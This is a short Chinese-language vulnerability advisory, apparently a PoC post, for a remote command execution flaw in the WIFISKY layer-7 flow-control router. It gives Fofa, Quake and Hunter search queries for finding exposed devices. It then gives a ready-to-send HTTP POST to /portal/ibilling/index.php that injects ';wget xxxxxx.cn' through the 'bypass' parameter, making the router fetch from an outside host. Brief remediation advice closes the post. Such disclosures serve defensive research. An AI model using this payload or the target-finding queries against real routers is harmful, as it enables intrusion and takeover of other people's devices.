**漏洞描述**

WIFISKY7层流控路由器存在rce, index 接口存在一个命令执行漏洞，使得攻击者可以通过构造特定的请求远程执行恶意代码。此漏洞可能导致攻击者获取系统权限、执行任意命令，严重威胁系统的机密性和完整性。

**空间测绘**

测绘语法：

```
Fofa：title="WIFISKY 7层流控路由器"
quake：title:"WIFISKY 7层流控路由器"
hunter：web.title="WIFISKY 7层流控路由器"
```

**漏洞复现**

命令执行：

```yaml
POST /portal/ibilling/index.php HTTP/1.1
Host: 
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36

{"type":5,"version":2,"bypass":";wget xxxxxx.cn"}
```

**修复意见**

1、请联系厂商进行修复。 

2、在后端过滤用户输入字符。 

3、设置白名单访问。